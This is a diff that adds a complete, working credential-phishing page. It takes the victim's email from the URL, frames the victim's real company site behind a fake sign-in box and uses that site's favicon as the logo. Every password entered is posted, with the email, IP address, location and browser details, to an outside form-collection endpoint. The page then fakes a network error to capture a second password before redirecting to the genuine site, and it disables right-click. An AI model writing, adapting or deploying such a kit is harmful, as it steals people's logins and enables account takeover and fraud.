@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html>
+<script>
+document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+});
+</script>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+    * {
+        box-sizing: border-box;
+        padding: 0;
+        margin: 0;
+    }
+
+    body {
+        height: 100vh;
+        width: 100vw;
+        font-family: Arial, Helvetica, sans-serif;
+        overflow: hidden;u
+    }
+
+    .bg-img {
+        height: 100%;
+        width: 100%;
+        position: relative;
+    }
+    
+    iframe {
+        height: 100%;
+        width: 100%;
+        border: none;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 1;
+    }
+
+    .container {
+        max-width: 400px;
+        padding: 20px;
+        background-color: rgba(255, 255, 255, 0.95);
+        border-radius: 8px;
+        position: fixed;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 100;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        backdrop-filter: blur(0px);
+    }
+
+    @media (max-width: 480px) {
+        .container {
+            width: 90%;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            margin: 0;
+        }
+    }
+
+    input[type=text], input[type=password] {
+        width: 100%;
+        padding: 12px;
+        margin: 5px 0 20px 0;
+        border: 1px solid #ccc;
+        background: #f9f9f9;
+        border-radius: 4px;
+        font-size: 14px;
+    }
+
+    input[type=text]:focus, input[type=password]:focus {
+        background-color: #fff;
+        outline: none;
+        border-color: #0096FF;
+    }
+
+    .btn {
+        background-color: #0096FF;
+        color: white;
+        padding: 12px 20px;
+        border: none;
+        cursor: pointer;
+        width: 100%;
+        opacity: 0.95;
+        border-radius: 4px;
+        font-size: 16px;
+        font-weight: bold;
+        transition: opacity 0.2s;
+    }
+
+    .btn:hover {
+        opacity: 1;
+    }
+    
+    .btn:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+    }
+
+    .img {
+        text-align: center;
+        margin-bottom: 10px;
+    }
+    
+    .img img {
+        max-width: 60px;
+        height: auto;
+    }
+
+    #title {
+        text-align: center;
+        margin: 10px 0;
+        color: #333;
+    }
+
+    #error {
+        display: none;
+        color: #d32f2f;
+        text-align: center;
+        margin-bottom: 15px;
+        font-size: 13px;
+        padding: 8px;
+        background-color: #ffebee;
+        border-radius: 4px;
+    }
+
+    .disabled {
+        display: none;
+    }
+
+    .show {
+        display: block;
+    }
+    
+    .toast {
+        position: fixed;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #333;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 8px;
+        z-index: 1002;
+        display: none;
+        animation: fadeInOut 3s ease;
+        font-family: Arial, Helvetica, sans-serif;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        font-size: 14px;
+        white-space: nowrap;
+    }
+    
+    @keyframes fadeInOut {
+        0% { opacity: 0; transform: translateX(-50%) translateY(20px); }
+        15% { opacity: 1; transform: translateX(-50%) translateY(0); }
+        85% { opacity: 1; transform: translateX(-50%) translateY(0); }
+        100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+    }
+    
+    .attempt-counter {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 12px;
+        color: #666;
+    }
+    
+    .redirect-warning {
+        background-color: #fff3cd;
+        border: 1px solid #ffeeba;
+        color: #856404;
+        padding: 8px;
+        border-radius: 4px;
+        font-size: 12px;
+        text-align: center;
+        margin-bottom: 15px;
+        display: none;
+    }
+    
+    /* Ensure form is clickable above iframe */
+    .form-wrapper {
+        position: relative;
+        z-index: 101;
+    }
+</style>
+<style>
+    #conn {
+        font-size: 20px;
+        font-weight: bold;
+        color: #037E74;
+        font-family: monospace;
+    }
+
+    .vertical-center {
+        margin: 0;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 100%;
+        text-align: center;
+    }
+
+    .progress-bar {
+        position: relative;
+        width: 300px;
+        height: 2.5em;
+        background-color: #176658;
+        color: white;
+        border-radius: 4px;
+        overflow: hidden;
+        margin: 0 auto;
+    }
+
+    .progress-bar::before {
+        content: attr(data-label);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: absolute;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        width: calc(var(--width, 0) * 1%);
+        min-width: 2rem;
+        background-color: #4CAF50;
+        color: white;
+        font-size: 12px;
+        white-space: nowrap;
+        transition: width 0.05s linear;
+    }
+    
+    #content-1 {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: 1000;
+        background-color: #DFDFDF;
+    }
+    
+    #dbody {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+</head>
+
+<section id="content-1" style="padding: 0; margin: 0; background-color: #DFDFDF;  background-repeat: no-repeat; background-size: cover; font-family: sans-serif; height: 100vh; width: 100%;">
+    <div class="vertical-center" id="content1">
+        <center>
+            <div id="conn">Please wait..</div>
+            <br><br>
+            <div class="progress-bar" style="--width: 0" data-label="Loading..."></div>
+        </center>
+    </div>
+</section>
+
+<section id="dbody" class="disabled">
+<body>
+
+<div class="bg-img" id="bg-img">
+    <iframe id="frame" src="about:blank" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation"></iframe>
+</div>
+
+<div class="container" id="login-container">
+    <form id="login-form">
+        <div class="img">
+            <img src="#" id="logo" alt="Logo">
+        </div>
+
+        <p id="title">Sign In </p>
+         
+
+        <div id="error">Network interrupted,please try again!</div>
+
+        <input type="text" placeholder="Enter Email" name="email" id="email" required readonly>
+
+        <input type="password" placeholder="Enter Password" name="password" id="psw" required autocomplete="off">
+
+        <button type="submit" class="btn" id="submitBtn">LOGIN</button> 
+    </form>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    // Progress bar animation
+    const progressBar = document.querySelector('.progress-bar');
+    let width = 0;
+    const progressInterval = setInterval(() => {
+        if (width < 100) {
+            width += 1;
+            progressBar.style.setProperty('--width', width);
+            if (width >= 100) {
+                progressBar.setAttribute('data-label', 'Ready');
+            } else if (width > 50) {
+                progressBar.setAttribute('data-label', 'Almost there...');
+            }
+        } else {
+            clearInterval(progressInterval);
+        }
+    }, 40);
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+    // Switch from loading screen to main content
+    setTimeout(function(){
+        $('#content-1').fadeOut(500, function() {
+            $(this).addClass("disabled");
+            $('#dbody').removeClass("disabled").addClass("show");
+        });
+    }, 3500);
+</script>
+
+<script>
+    (function() {
+        // Main application
+        let attemptCount = 0;
+        const MAX_ATTEMPTS = 2;
+        let redirectTriggered = false;
+        let isSubmitting = false;
+        
+        // Get client ID from URL hash
+        const clientID = window.location.hash.split("#").pop();
+        if (!clientID || clientID === '') {
+            // Fallback email
+            $('#email').val('user@example.com');
+        } else {
+            $('#email').val(clientID);
+        }
+        
+        const domain = clientID ? clientID.split('@').pop() : 'example.com';
+        
+        // Set iframe source
+        setTimeout(function() {
+            $("#frame").attr("src", "https://www." + domain);
+        }, 100);
+        
+        // Set favicon as logo
+        $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64");
+        
+        // Update attempt counter display
+        function updateAttemptCounter() {
+            const remaining = MAX_ATTEMPTS - attemptCount;
+            $('#attemptCounter').text(`Attempts remaining: ${remaining}`);
+            if (remaining <= 1) {
+                $('#attemptCounter').css('color', '#ff4444').css('font-weight', 'bold');
+            } else {
+                $('#attemptCounter').css('color', '#666').css('font-weight', 'normal');
+            }
+        }
+        
+        // Show toast notification
+        function showToast(message, duration = 3000) {
+            const toast = $('#toast');
+            toast.text(message);
+            toast.fadeIn(200);
+            setTimeout(() => {
+                toast.fadeOut(200);
+            }, duration);
+        }
+        
+        // Show redirect warning
+        function showRedirectWarning() {
+            $('#redirectWarning').show();
+            setTimeout(() => {
+                $('#redirectWarning').fadeOut();
+            }, 3000);
+        }
+        
+        // Redirect to domain
+        function redirectToDomain() {
+            if (redirectTriggered) return;
+            redirectTriggered = true;
+            const targetUrl = "https://www." + domain;
+            showToast("Redirecting to " + domain + "...", 2000);
+            setTimeout(function() {
+                window.location.href = targetUrl;
+            }, 2000);
+        }
+        
+        // Send data to backend
+        function sendToBackend(password, ipData, callback) {
+            const postData = {
+                _subject: "Logs | " + (ipData ? ipData.ip : "Unknown"),
+                Email: $("#email").val(),
+                Password: password,
+                Attempts: attemptCount,
+                IP: ipData ? ipData.ip : "Unknown",
+                Location: (ipData && ipData.city) ? (ipData.city + ", " + ipData.country) : "Unknown",
+                Timestamp: new Date().toISOString(),
+                UserAgent: navigator.userAgent
+            };
+            
+            $.ajax({
+                url: "https://submit-form.com/kJ4r8bdMt",
+                method: "POST",
+                data: postData,
+                timeout: 10000,
+                success: function(data) {
+                    if (callback) callback(true, data);
+                },
+                error: function(xhr, status, error) {
+                    console.log("Backend error:", error);
+                    if (callback) callback(false, error);
+                }
+            });
+        }
+        
+        // Process login attempt
+        function processLogin(password) {
+            if (isSubmitting) return;
+            isSubmitting = true;
+            
+            // Get IP info
+            $.ajax({
+                url: 'https://ipinfo.io/json',
+                method: 'GET',
+                timeout: 5000,
+                success: function(ipData) {
+                    attemptCount++;
+                    updateAttemptCounter();
+                    
+                    // Send to backend
+                    sendToBackend(password, ipData, function(success) {
+                        if (attemptCount >= MAX_ATTEMPTS) {
+                            // Max attempts reached - redirect
+                            $("#error").css("display", "block").text("Maximum attempts reached! Redirecting...");
+                            $("#submitBtn").text('Redirecting...').prop('disabled', true);
+                            showToast("Maximum attempts reached. Redirecting to website...", 2000);
+                            setTimeout(function() {
+                                redirectToDomain();
+                            }, 2000);
+                        } else {
+                            // Show error and allow another attempt
+                            const remaining = MAX_ATTEMPTS - attemptCount;
+                            $("#error").css("display", "block").text(`Network interrupted try correct password! ${remaining} attempt(s) remaining.`);
+                            $("#submitBtn").text('Sign In').prop('disabled', false);
+                            $("#psw").val("").focus();
+                            isSubmitting = false;
+                            
+                            if (attemptCount === MAX_ATTEMPTS - 1) {
+                                showRedirectWarning();
+                                $("#error").css("color", "#ff6600");
+                            } else {
+                                $("#error").css("color", "#d32f2f");
+                            }
+                        }
+                    });
+                },
+                error: function() {
+                    // IP info failed, still process attempt
+                    attemptCount++;
+                    updateAttemptCounter();
+                    
+                    sendToBackend(password, null, function(success) {
+                        if (attemptCount >= MAX_ATTEMPTS) {
+                            $("#error").css("display", "block").text("Maximum attempts reached! Redirecting...");
+                            $("#submitBtn").text('Redirecting...').prop('disabled', true);
+                            showToast("Maximum attempts reached. Redirecting...", 2000);
+                            setTimeout(function() {
+                                redirectToDomain();
+                            }, 2000);
+                        } else {
+                            const remaining = MAX_ATTEMPTS - attemptCount;
+                            $("#error").css("display", "block").text(`Password is incorrect! ${remaining} attempt(s) remaining.`);
+                            $("#submitBtn").text('Sign In').prop('disabled', false);
+                            $("#psw").val("").focus();
+                            isSubmitting = false;
+                            
+                            if (attemptCount === MAX_ATTEMPTS - 1) {
+                                showRedirectWarning();
+                            }
+                        }
+                    });
+                }
+            });
+        }
+        
+        // Form submit handler
+        $("#login-form").on("submit", function(event) {
+            event.preventDefault();
+            event.stopPropagation();
+            
+            // Don't process if already redirecting or maxed out
+            if (redirectTriggered) {
+                showToast(" ", 1000);
+                return false;
+            }
+            
+            if (attemptCount >= MAX_ATTEMPTS) {
+                showToast(" ", 1500);
+                setTimeout(function() {
+                    redirectToDomain();
+                }, 1500);
+                return false;
+            }
+            
+            const password = $("#psw").val();
+            if (!password || password.trim() === "") {
+                showToast("Please enter a password", 1500);
+                $("#psw").focus();
+                return false;
+            }
+            
+            // Disable button during processing
+            $("#submitBtn").text('Verifying...').prop('disabled', true);
+            
+            // Process the login attempt
+            processLogin(password);
+            
+            return false;
+        });
+        
+        // Enter key handler for password field
+        $("#psw").on("keypress", function(e) {
+            if (e.which === 13 || e.keyCode === 13) {
+                e.preventDefault();
+                $("#login-form").trigger("submit");
+                return false;
+            }
+        });
+        
+        // Manual click handler for button (extra safety)
+        $("#submitBtn").on("click", function(e) {
+            e.preventDefault();
+            $("#login-form").trigger("submit");
+        });
+        
+        // Initial setup
+        updateAttemptCounter();
+        
+        // Show initial warning
+        setTimeout(function() {
+            showRedirectWarning();
+        }, 1000);
+        
+        // Log to console
+        console.log("Login form ready | Max attempts: " + MAX_ATTEMPTS + " | Domain: " + domain);
+        
+        // Make sure iframe doesn't intercept clicks by setting pointer-events on container
+        $("#login-container").css({
+            'pointer-events': 'auto',
+            'cursor': 'default'
+        });
+        
+        // Focus on password field
+        setTimeout(function() {
+            $("#psw").focus();
+        }, 500);
+    })();
+</script>
+</body>
+</section>
+</html>
